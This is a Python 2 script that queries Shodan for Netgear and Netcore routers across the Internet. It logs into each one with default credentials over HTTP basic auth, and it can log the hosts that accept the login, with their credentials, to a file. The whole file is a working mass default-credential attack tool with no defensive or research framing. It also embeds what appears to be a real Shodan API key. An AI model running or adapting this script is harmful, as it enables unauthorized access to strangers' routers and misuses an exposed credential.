import shodan
import requests
from requests.auth import HTTPBasicAuth
SHODAN_API_KEY = "Rxo5537XxTXviude3D4RSVlTwkzmUkKX"

api = shodan.Shodan(SHODAN_API_KEY)

#Get input on type
router=raw_input('Choose Router to Map:\n\n1. Netgear\n2. Netcore\n\nType:')
verbose=raw_input('Verbosity Level(1-3):')
verbose=int(verbose)
writef=raw_input('Write to file(y/n):')
print writef
f=open("BMAnet.log","a+")
#If statement for checking type
if router=='1':
    username=raw_input('Username[admin]:')
    password=raw_input('Password[password]:')
    if username=='':
        username='admin'
    if password=='':
        password='password'
    # Search Shodan
    results = api.search('netgear')

    # Show the results
    print 'Results found: %s' % results['total']
    for result in results['matches']:
        url='http://'+result['ip_str']+':'+str(result['port'])
        #print 'Requesting: '+url
        try:
            r=requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
            if r.status_code==200:
                print '[+] Vulnerable: http://'+result['ip_str']+':'+str(result['port'])
                if writef=='y':
                    f.write('http://'+result['ip_str']+':'+str(result['port'])+','+username+','+password+'\n')
            if r.status_code==401 and verbose==3:
                print '[-] Login Failed:'+result['ip_str']+':'+str(result['port'])
        except:
            if verbose>=2:
                print url, 'Timed out.'
            #print result['data']
            
if router=='2':
    username=raw_input('Username[guest]:')
    password=raw_input('Password[guest]:')
    if username=='':
        username='guest'
    if password=='':
        password='guest'
    # Search Shodan
    results = api.search('netcore')

    # Show the results
    print 'Results found: %s' % results['total']
    for result in results['matches']:
        url='http://'+result['ip_str']+':'+str(result['port'])
        #print 'Requesting: '+url
        try:
            r=requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
            if r.status_code==200:
                print '[+] Vulnerable: http://'+result['ip_str']+':'+str(result['port'])
                if writef=='y':
                    f.write('http://'+result['ip_str']+':'+str(result['port'])+','+username+','+password+'\n')
            if r.status_code==401 and verbose==3:
                print '[-] Login Failed:'+result['ip_str']+':'+str(result['port'])
        except:
            if verbose>=2:
                print url, 'Timed out.'
            #print result['data']
f.close()
